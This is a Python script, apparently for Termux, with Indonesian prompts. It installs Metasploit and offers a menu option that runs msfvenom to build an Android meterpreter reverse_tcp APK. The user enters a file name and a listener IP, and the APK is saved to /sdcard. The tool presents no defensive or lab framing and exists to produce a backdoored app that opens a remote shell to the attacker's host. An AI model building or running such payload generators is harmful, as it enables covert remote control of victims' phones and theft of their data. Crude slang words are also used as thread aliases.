import os
import time


def logo():
	os.system('clear')
	print ("""

\033[1;92m   __  ___    __       ____         __       ____
\033[1;92m  /  |/  /__ / /____ _/  _/__  ___ / /____ _/ / /
\033[1;97m / /|_/ / -_) __/ _ `// // _ \(_-</ __/ _ `/ / / 
\033[1;97m/_/  /_/\__/\__/\_,_/___/_//_/___/\__/\_,_/_/_/  

		\033[1;96mMetasploit Install\n""")

def menu():
	logo()
	print ("""
		\033[1;91m[1] \033[1;93mMetaInstall
		\033[1;91m[2] \033[1;93mFixError Meta
		\033[1;91m[3] \033[1;93mPayloads Set
		\033[1;91m[4] \033[1;93mExit \n""")

def metainstall():
	os.system('pkg install metasploit -y -y &> /dev/null')

def fixerror():
	os.system('bundle install nokogiri &> /dev/null')

def payloads():
	os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} R > /sdcard/{}.apk &> /dev/null'.format(ip,namefile))

if __name__=="__main__":
	from threading import Thread as fucek
	import sys, time
	menu()
	try:
		pil = str(input("\033[1;91m\t> \033[1;93m"))
		if not pil:
			exit()
		if pil == "1":
			print ("\033[1;91m\t> \033[1;93mWaktu install +20mins")
			t = fucek(target=metainstall)
			t.start()
			while t.is_alive():
				for i in "-\|/-\|/":
					print ("\r\033[1;91m\t> \033[1;93mSedang Menginstall \033[1;95m"+i+'',end="",flush=True)
					time.sleep(0.1)

			print ("\n\033[1;91m\t> \033[1;93mDone")

		elif pil == "2":
			from threading import Thread as kontol
			t = kontol(target=fixerror)
			t.start()
			while t.is_alive():
				for i in "-\|/-\|/":
					print ("\r\t\033[1;91m> \033[1;93mTunggu sebentar \033[1;95m"+i+'',end="",flush=True)
					time.sleep(0.1)

			print ("\n\033[1;91m\t> \033[1;93mDone")

		elif pil == "3":
			from threading import Thread as pepek
			print ("\n\t\033[1;92m[Set payloads]")
			print ("\033[1;91m\t> \033[1;93mName file")
			namefile = str(input("\033[1;91m\t> \033[1;93m"))
			print ("\033[1;91m\t> \033[1;93mHost IP")
			ip = str(input("\033[1;91m\t> \033[1;93m"))


			t = pepek(target=payloads)
			t.start()
			while t.is_alive():
				for i in "-\|/-\|/":
					print ("\r\t\033[1;91m> \033[1;93mTunggu sebentar \033[1;95m"+i+'',end="",flush=True)
					time.sleep(0.1)
			print ("\n\033[1;91m\t> \033[1;93mDone")




		else:
			exit()

	except:
		exit()
